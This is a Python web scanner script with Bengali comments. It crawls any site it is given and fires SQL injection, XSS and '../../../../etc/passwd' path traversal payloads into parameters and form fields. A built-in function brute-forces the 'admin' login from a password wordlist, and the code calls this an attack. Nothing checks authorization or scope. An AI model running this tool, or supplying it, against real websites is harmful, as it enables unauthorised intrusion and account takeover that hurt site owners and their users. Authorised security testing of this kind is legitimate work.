import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import time
from selenium import webdriver

# সমস্ত লিঙ্ক খুঁজে বের করার ফাংশন
def find_links(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()

        # সমস্ত <a> ট্যাগ থেকে লিঙ্ক সংগ্রহ করা
        for a_tag in soup.find_all('a', href=True):
            link = urllib.parse.urljoin(url, a_tag['href'])
            if url in link:  # শুধুমাত্র মূল ডোমেইনের লিঙ্ক খুঁজবে
                links.add(link)
        return links
    except Exception as e:
        print(f"Error fetching links from {url}: {e}")
        return set()

# SQL ইনজেকশন টেস্ট
def sql_injection_test(url, params):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #"]
    vulnerable = False
    
    for payload in sql_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            
            response = requests.get(url, params=test_params)
            if "SQL" in response.text or "syntax" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")

# XSS টেস্ট ফাংশন
def xss_test(url, params):
    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
    vulnerable = False

    for payload in xss_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Possible XSS vulnerability found with payload: {payload} on param: {param}")
                vulnerable = True
                break

    if not vulnerable:
        print("No XSS vulnerabilities found.")

# হেডার এনালাইসিস
def analyze_headers(url):
    response = requests.get(url)
    headers = response.headers
    if 'X-Frame-Options' not in headers:
        print(f"X-Frame-Options header missing on {url}")
    if 'X-Content-Type-Options' not in headers:
        print(f"X-Content-Type-Options header missing on {url}")
    if 'Strict-Transport-Security' not in headers:
        print(f"Strict-Transport-Security header missing on {url}")

# ফর্ম ম্যানিপুলেশন চেক
def form_analysis(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urllib.parse.urljoin(url, action)

            print(f"Form found on {form_url} with method {method.upper()}")

            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                value = inp.get('value', 'test')
                if name:
                    form_data[name] = value

            # ফর্ম ইনজেকশন টেস্ট
            sql_injection_test(form_url, form_data)
            xss_test(form_url, form_data)

    except Exception as e:
        print(f"Error analyzing forms on {url}: {e}")

# Custom Brute Force Attack with Wordlist
def brute_force_login(url, username_param, password_param, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        data = {
            username_param: 'admin',  # আপনি যদি অন্য ইউজারনেম ব্যবহার করতে চান
            password_param: password
        }

        response = requests.post(url, data=data)
        if "Login Successful" in response.text:  # লগইন সফল হলে এখানে একটি কন্ডিশন সেট করতে হবে
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Attempted with password: {password}")

# AJAX এবং JavaScript Loaded লিঙ্ক ক্রল করা (Selenium ব্যবহার করে)
def deep_crawl_with_selenium(url):
    driver = webdriver.Firefox()  # আপনি ChromeDriver ও ব্যবহার করতে পারেন
    driver.get(url)
    time.sleep(3)  # JavaScript লোড হওয়ার জন্য সময় দিন

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, 'html.parser')

    links = set()
    for a_tag in soup.find_all('a', href=True):
        link = urllib.parse.urljoin(url, a_tag['href'])
        if url in link:
            links.add(link)
    
    driver.quit()
    return links

# প্যারামিটার ফাজিং ফাংশন (Random Parameters ব্যবহার করে)
def parameter_fuzzing(url, params):
    fuzz_payloads = ["../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
    vulnerable = False

    for payload in fuzz_payloads:
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            response = requests.get(url, params=test_params)
            if payload in response.text:
                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
                vulnerable = True

    if not vulnerable:
        print("No vulnerabilities found with parameter fuzzing.")

# মেইন স্ক্যানিং ফাংশন
def scan_website(url, wordlist=None):
    # লিঙ্ক খোঁজা
    links = find_links(url)

    # যদি JavaScript Loaded লিঙ্ক ক্রল করতে চান
    deep_links = deep_crawl_with_selenium(url)
    links.update(deep_links)

    # সমস্ত লিঙ্ক স্ক্যান করা
    for link in links:
        print(f"Scanning {link} ...")
        analyze_headers(link)  # হেডার এনালাইসিস
        form_analysis(link)    # ফর্ম চেক করা
        time.sleep(1)          # প্রতিটি স্ক্যানের মাঝে কিছুটা সময় বিরতি

    # যদি Custom Brute Force Attack করতে চান
    if wordlist:
        print("Starting brute force attack...")
        brute_force_login(url, 'username', 'password', wordlist)

# মেইন ফাংশন
if __name__ == "__main__":
    website_url = input("Enter the website URL (e.g., https://lifetoor.com): ")
    wordlist_path = input("Enter the path to the wordlist for brute force (leave blank to skip): ")
    
    if wordlist_path:
        scan_website(website_url, wordlist_path)
    else:
        scan_website(website_url)
